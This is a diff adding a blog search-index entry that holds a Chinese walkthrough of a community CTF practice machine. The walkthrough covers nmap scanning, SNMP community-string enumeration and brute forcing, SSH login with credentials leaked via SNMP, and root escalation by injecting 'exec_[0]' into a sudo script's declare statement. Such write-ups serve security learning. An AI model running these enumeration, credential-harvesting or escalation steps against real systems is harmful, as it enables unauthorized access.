@@ -81,6 +81,37 @@
     </entry>
     
     
+    
+    <entry>
+      <title>113_提权处理</title>
+      <link href="/2025/12/18/113-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/"/>
+      <url>/2025/12/18/113-%E6%8F%90%E6%9D%83%E5%A4%84%E7%90%86/</url>
+      
+        <content type="html"><![CDATA[<h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><p>扫描tcp udp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -T4 -p- 192.168.0.105</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU -F 192.168.0.105</span><br></pre></td></tr></table></figure><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20260119201121265.png" alt="image-20260119201121265"></p><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/image-20260119201138058.png" alt="image-20260119201138058"></p><p>扫到了一个161端口</p><p>161端口是常见的SNMP服务</p><p>很多设备的SNMP配置了默认的社区字符串（如public&#x2F;private）</p><p>用工具读取系统信息 用户列表 甚至修改配置</p><p>1.用snmpwalk枚举系统信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v2c -c public 192.168.0.105</span><br></pre></td></tr></table></figure><p>2.用onesixtyone 爆破社区字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.0.105</span><br></pre></td></tr></table></figure><p><img src="https://xiaxianiu.oss-cn-beijing.aliyuncs.com/93aa539f5aaac2c11fb6bc3df8d9e3e.png" alt="93aa539f5aaac2c11fb6bc3df8d9e3e"></p><p>可以看到用户名和密码</p><p>welcome：mMOq2WWONQiiY8TinSRF</p><p>接下来用ssh进行连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh welcome@192.168.0.105</span><br></pre></td></tr></table></figure><h3 id="二、提取处理"><a href="#二、提取处理" class="headerlink" title="二、提取处理"></a>二、提取处理</h3><p>用sudo -l可以看到存在&#x2F;opt&#x2F;113.sh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">welcome@113:~$ sudo -l</span><br><span class="line">Matching Defaults entries for welcome on 113:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User welcome may run the following commands on 113:</span><br><span class="line">    (ALL) NOPASSWD: /opt/113.sh</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进入后查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">welcome@113:~$ cat /opt/113.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">sandbox=$(mktemp -d) #生成随机临时目录</span><br><span class="line">cd $sandbox</span><br><span class="line"></span><br><span class="line">if [ &quot;$#&quot; -ne 3 ];then</span><br><span class="line">        exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ &quot;$3&quot; != &quot;mazesec&quot; ]  #检查第三个参数是否是‘mazesec’</span><br><span class="line">then</span><br><span class="line">        echo &quot;\$3 must be mazesec&quot;</span><br><span class="line">        exit </span><br><span class="line">else</span><br><span class="line">        /bin/cp /usr/bin/mazesec $sandbox</span><br><span class="line">        exec_=&quot;$sandbox/mazesec&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ &quot;$1&quot; = &quot;exec_&quot; ];then  #检查第一个参数是否是‘exec_’</span><br><span class="line">        exit   #是就推出</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">declare -- &quot;$1&quot;=&quot;$2&quot;  #危险操作：用户可控的变量赋值</span><br><span class="line">$exec_  #执行exec_变量指向命令</span><br></pre></td></tr></table></figure><p><strong>核心漏洞</strong>：<code>declare -- &quot;$1&quot;=&quot;$2&quot;</code> 无过滤的变量赋值，是整个脚本的 “命门”，它允许攻击者绕过字符串检测，间接修改受保护的<code>exec_</code>变量</p><p><strong>约束条件</strong>：如果尝试直接将 $1 设置为 exec_ 来覆盖它，脚本会通过 if [ “$1” &#x3D; “exec_” ] 检测并退出。</p><p><strong>绕过方法</strong>：var和数组的第一个元素var[0]是等价的 也就是说$exec_等同于${exec_[0]}</p><p>​所以我们可以传入exec_[0]作为$1</p><p>​[“exec_[0]”&#x3D;”exec_”]这个判断为false（因为字符串不相等），从而绕过检测</p><p>​declare – “exec_[0]”&#x3D;”&#x2F;bin&#x2F;bash”执行时，实际巡航覆盖了$exec__的值</p><p><strong>提权命令</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo /opt/113.sh exec_[0] /bin/bash mazesec</span><br><span class="line">├── sudo               # 以root权限执行后续命令（提权的基础）</span><br><span class="line">├── /opt/113.sh        # 目标漏洞脚本（我们要利用的程序）</span><br><span class="line">├── exec_[0]           # 第一个参数（$1）：绕过检测的核心技巧</span><br><span class="line">├── /bin/bash          # 第二个参数（$2）：我们要执行的提权命令</span><br><span class="line">└── mazesec            # 第三个参数（$3）：满足脚本的强制要求</span><br></pre></td></tr></table></figure><p>从而得到flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+          <category> 群友靶机 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SSH爆破 </tag>
+            
+            <tag> 提权 </tag>
+            
+            <tag> SNMP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
   
   
 </search>
